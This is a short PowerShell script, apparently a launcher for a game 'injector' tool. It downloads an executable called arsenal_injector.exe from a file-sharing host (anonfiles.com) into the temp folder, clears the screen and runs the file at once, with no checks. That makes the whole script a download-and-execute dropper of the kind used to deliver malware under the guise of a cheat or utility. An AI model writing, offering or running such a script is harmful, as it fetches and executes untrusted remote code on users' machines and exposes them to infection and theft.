$ProcName = "arsenal_injector.exe"
$WebFile = "https://cdn-153.anonfiles.com/pcv5Feu9zd/a3101b97-1685618318/$ProcName"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:temp\$ProcName")
Start-Process ("$env:temp\$ProcName")
